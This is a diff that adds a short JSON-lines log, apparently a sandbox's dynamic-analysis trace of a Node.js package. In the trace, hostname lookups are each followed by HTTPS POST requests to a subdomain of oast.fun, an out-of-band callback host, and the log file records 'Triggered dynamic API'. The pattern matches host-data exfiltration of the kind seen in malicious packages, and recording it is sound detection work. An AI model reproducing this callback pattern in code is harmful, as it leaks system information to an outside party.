@@ -1,0 +1,8 @@
+{"timestamp":1748957245148,"api":"os.hostname","args":[]}
+{"timestamp":1748957245149,"api":"https.request","args":["{\"hostname\":\"cjrtc7r2vtc000013170gjcpgryyyyyyb.oast.fun\",\"port\":443,\"path\":\"/\",\"method\":\"POST\",\"headers\":{\"Content-Type\":\"application/x-www-form-urlencoded\",\"Content-Length\":679}}",null]}
+{"timestamp":1748959543630,"api":"os.hostname","args":[]}
+{"timestamp":1748959543631,"api":"https.request","args":["{\"hostname\":\"cjrtc7r2vtc000013170gjcpgryyyyyyb.oast.fun\",\"port\":443,\"path\":\"/\",\"method\":\"POST\",\"headers\":{\"Content-Type\":\"application/x-www-form-urlencoded\",\"Content-Length\":679}}",null]}
+{"timestamp":1748959543655,"api":"fs.writeFileSync","args":["dynamic_log.txt","Triggered dynamic API"]}
+{"timestamp":1749020147998,"api":"os.hostname","args":[]}
+{"timestamp":1749020147999,"api":"https.request","args":["{\"hostname\":\"cjrtc7r2vtc000013170gjcpgryyyyyyb.oast.fun\",\"port\":443,\"path\":\"/\",\"method\":\"POST\",\"headers\":{\"Content-Type\":\"application/x-www-form-urlencoded\",\"Content-Length\":665}}",null]}
+{"timestamp":1749020148039,"api":"fs.writeFileSync","args":["dynamic_log.txt","Triggered dynamic API"]}
